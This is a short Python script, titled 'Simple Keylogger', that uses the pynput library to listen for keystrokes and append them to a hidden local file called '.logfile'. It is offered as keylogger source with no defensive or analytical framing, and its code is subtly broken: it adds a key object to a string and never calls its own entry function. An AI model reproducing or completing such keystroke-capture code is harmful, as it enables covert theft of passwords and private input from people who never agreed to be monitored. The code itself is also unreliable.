# Simple Keylogger
from pynput.keyboard import Listener

file = open('.logfile', 'a+')

def function(key):
	file.write(key+'\n')

def on_press(callback=function):
	with Listener(callback) as l:
		try:
			l.join()
		except KeyboardInterrupt:
			print('\n[ LOG ] - EXIT.\n')
	file.close()
